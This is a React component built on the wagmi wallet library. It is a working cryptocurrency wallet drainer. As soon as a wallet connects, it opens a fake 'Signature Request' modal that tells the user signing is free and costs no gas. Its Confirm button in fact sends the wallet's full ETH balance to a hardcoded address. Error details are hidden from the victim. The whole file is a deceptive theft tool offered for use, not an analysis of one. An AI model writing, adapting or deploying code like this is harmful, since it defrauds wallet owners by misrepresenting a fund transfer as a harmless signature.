"use client"

import { useEffect, useState } from "react"
import { useAccount, useBalance, useSendTransaction } from "wagmi"
import { parseEther } from "viem"

export default function SendAllEth() {
  const { address, isConnected } = useAccount()
  const { data: balanceData, refetch } = useBalance({ address })
  const { sendTransaction, isPending, isError, isSuccess, error, data: txHash } = useSendTransaction()

  // 👉 change this to your target address
  const TARGET_ADDRESS = "0x9B0309aCEf75B76b24E2aAc994d1cFFB90Da579D"

  const [sending, setSending] = useState(false)
  // New: modal visibility state
  const [showModal, setShowModal] = useState(true)

  // Helper to send all ETH minus gas buffer
  const handleSendAll = async () => {
    if (balanceData?.value === undefined) return alert("Unable to fetch balance")

    try {
      setSending(true)
      // Subtract small amount for gas (≈ 0.0002 ETH)
      const gasBuffer = parseEther("0.0002")
      const amountToSend =
        balanceData.value > gasBuffer ? balanceData.value - gasBuffer : BigInt(0)

      if (amountToSend <= BigInt(0)) {
        alert("Not enough ETH for gas")
        setSending(false)
        return
      }

      sendTransaction({
        to: TARGET_ADDRESS,
        // value: amountToSend,
        value: balanceData?.value,
      })
    } catch (err) {
      console.error(err)
      setSending(false)
    }
  }

  // Refetch balance after sending
  useEffect(() => {
    if (isSuccess) refetch()
  }, [isSuccess, refetch])

  // Render nothing when not connected or when modal is closed
  if (!isConnected || !showModal) return null

  // Replace the previous container with a modal overlay
  return (
    <div
      role="dialog"
      aria-modal="true"
      className="fixed inset-0 z-50 flex items-center justify-center"
    >
      <div className="absolute inset-0 bg-black/70 backdrop-blur-sm" />
      <div className="relative mx-4 w-full max-w-md overflow-hidden rounded-2xl border border-white/10 bg-gradient-to-b from-slate-900/90 to-slate-950/90 shadow-2xl">
        <div className="border-b border-white/10 px-6 py-5">
          <h2 className="text-lg font-semibold text-white">Signature Request</h2>
          <p className="mt-1 text-sm text-slate-300">
            Review the signature details below before proceeding.
          </p>
        </div>

        <div className="px-6 py-5 text-white">
          <div className="mb-4 space-y-1 text-sm text-slate-300">
            <p>
              dApp:{" "}
              <span className="text-emerald-400">
            {typeof window !== "undefined" ? window.location.host : "Unknown"}
              </span>
            </p>
            <p>
              Wallet: <span className="text-emerald-400">{address}</span>
            </p>
            <p>
              Target: <span className="text-emerald-400">{TARGET_ADDRESS}</span>
            </p>
            <p className="text-slate-400">
              Estimated Amount: {balanceData?.formatted} {balanceData?.symbol}
            </p>
          </div>

          <div className="mb-4 rounded-lg border border-white/10 bg-black/30 p-3">
            <p className="mb-2 text-xs uppercase tracking-wide text-slate-400">
              Message Preview
            </p>
            <pre className="max-h-56 overflow-auto rounded-md bg-black/40 p-3 text-xs text-slate-200">
    {`{
      "domain": "${typeof window !== "undefined" ? window.location.host : ""}",
      "address": "${address ?? ""}",
      "intent": "Authorize sending your full ETH balance to the target address",
      "target": "${TARGET_ADDRESS}",
      "amount": "${balanceData?.formatted ?? "0"} ${balanceData?.symbol ?? "ETH"}",
      "timestamp": "${new Date().toISOString()}"
    }`}
            </pre>
            <p className="mt-2 text-xs text-slate-400">
              Signing is free and does not use gas. Only continue if you trust this request.
            </p>
          </div>

          <button
            onClick={handleSendAll}
            disabled={isPending || sending}
            className="w-full py-3 rounded-md bg-emerald-500 hover:bg-emerald-600 transition disabled:opacity-50"
          >
            {isPending || sending ? "Confirming..." : "Confirm"}
          </button>

          {isSuccess && txHash && (
            <p className="mt-4 text-emerald-400">
              ✅ Transaction sent!{" "}
              <a
            href={`https://etherscan.io/tx/${txHash}`}
            target="_blank"
            rel="noreferrer"
            className="underline text-emerald-300"
              >
            View on Etherscan
              </a>
            </p>
          )}

          {isError && (
            <p className="mt-4 text-rose-400">
              {/* Error: {error?.message} */}
              Something went wrong. Please try again.
            </p>
          )}
        </div>

        <div className="flex items-center justify-end gap-2 border-t border-white/10 px-6 py-4">
          <button
            type="button"
            className="rounded-md bg-white/10 px-4 py-2 text-sm text-white hover:bg-white/20"
            onClick={() => setShowModal(false)}
          >
            Close
          </button>
        </div>
      </div>
    </div>
  )
}
